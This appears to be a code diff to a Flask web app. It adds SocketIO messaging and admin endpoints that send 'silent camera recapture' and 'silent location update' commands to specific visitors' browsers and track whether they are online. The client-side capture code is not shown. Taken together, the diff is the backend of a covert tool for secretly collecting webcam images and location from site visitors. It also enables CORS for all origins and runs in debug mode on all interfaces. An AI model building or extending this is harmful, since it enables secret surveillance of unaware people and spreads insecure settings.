@@ -8,6 +8,7 @@ from flask import Flask, render_template, request, jsonify, redirect, url_for, s
 from flask_sqlalchemy import SQLAlchemy
 from werkzeug.security import check_password_hash
 from flask_migrate import Migrate
+from flask_socketio import SocketIO, emit, join_room, leave_room
 import pytz
 
 # Load environment variables
@@ -41,6 +42,12 @@ IST = pytz.timezone('Asia/Kolkata')
 # Initialize database
 db = SQLAlchemy(app)
 migrate = Migrate(app, db)
+
+# Initialize SocketIO for real-time communication
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
+
+# Store active visitor sessions (visitor_id -> session_id)
+active_visitors = {}
 
 # Utility function to get current IST time
 def get_ist_time():
@@ -565,6 +572,88 @@ def get_camera(visitor_id):
         print(f"Error getting camera: {e}")
         return jsonify({'success': False, 'message': str(e)})
 
+
+# SocketIO event handlers
+@socketio.on('connect')
+def handle_connect():
+    print(f'Client connected: {request.sid}')
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    # Remove visitor from active sessions
+    for visitor_id, sid in list(active_visitors.items()):
+        if sid == request.sid:
+            del active_visitors[visitor_id]
+            print(f'Visitor {visitor_id} disconnected')
+    print(f'Client disconnected: {request.sid}')
+
+@socketio.on('register_visitor')
+def handle_register_visitor(data):
+    visitor_id = data.get('visitor_id')
+    if visitor_id:
+        active_visitors[visitor_id] = request.sid
+        join_room(f'visitor_{visitor_id}')
+        print(f'Visitor {visitor_id} registered with session {request.sid}')
+        emit('registered', {'status': 'success'})
+
+# Admin trigger endpoints
+@app.route('/api/trigger_recapture_camera/<int:visitor_id>', methods=['POST'])
+@login_required
+def trigger_recapture_camera(visitor_id):
+    """Admin endpoint to trigger silent camera recapture"""
+    try:
+        if visitor_id in active_visitors:
+            # Send command to visitor's browser
+            socketio.emit('recapture_camera', 
+                         {'visitor_id': visitor_id}, 
+                         room=f'visitor_{visitor_id}')
+            return jsonify({
+                'success': True, 
+                'message': 'Camera recapture command sent',
+                'status': 'online'
+            })
+        else:
+            return jsonify({
+                'success': False, 
+                'message': 'Visitor is not currently online',
+                'status': 'offline'
+            })
+    except Exception as e:
+        return jsonify({'success': False, 'message': str(e)})
+
+@app.route('/api/trigger_recapture_location/<int:visitor_id>', methods=['POST'])
+@login_required
+def trigger_recapture_location(visitor_id):
+    """Admin endpoint to trigger silent location update"""
+    try:
+        if visitor_id in active_visitors:
+            # Send command to visitor's browser
+            socketio.emit('recapture_location', 
+                         {'visitor_id': visitor_id}, 
+                         room=f'visitor_{visitor_id}')
+            return jsonify({
+                'success': True, 
+                'message': 'Location update command sent',
+                'status': 'online'
+            })
+        else:
+            return jsonify({
+                'success': False, 
+                'message': 'Visitor is not currently online',
+                'status': 'offline'
+            })
+    except Exception as e:
+        return jsonify({'success': False, 'message': str(e)})
+
+@app.route('/api/check_visitor_online/<int:visitor_id>', methods=['GET'])
+@login_required
+def check_visitor_online(visitor_id):
+    """Check if visitor is currently online"""
+    is_online = visitor_id in active_visitors
+    return jsonify({
+        'online': is_online,
+        'visitor_id': visitor_id
+    })
 
 if __name__ == '__main__':
     app.run(debug=True,host='0.0.0.0')
